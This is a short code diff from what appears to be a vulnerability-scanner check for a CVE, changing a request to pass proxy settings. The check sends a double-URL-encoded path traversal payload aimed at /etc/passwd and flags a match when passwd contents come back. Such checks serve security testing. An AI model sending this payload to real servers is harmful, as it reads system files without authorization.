@@ -26,7 +26,7 @@ def check(url, proxies=None):
     payload = "test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd"
     target_url = url + payload
     try:
-        res = requests.get(target_url, headers=DEFAULT_HEADER, timeout=TIMEOUT, verify=False)
+        res = requests.get(target_url, headers=DEFAULT_HEADER, timeout=TIMEOUT, verify=False, proxies=proxies)
         if res.status_code == 200 and r"x:0:0:root:/root:" in res.text and r"/sbin/nologin" in res.text and r"daemon" in res.text:
             return True, {
                 "CVE_ID": CVE_ID,
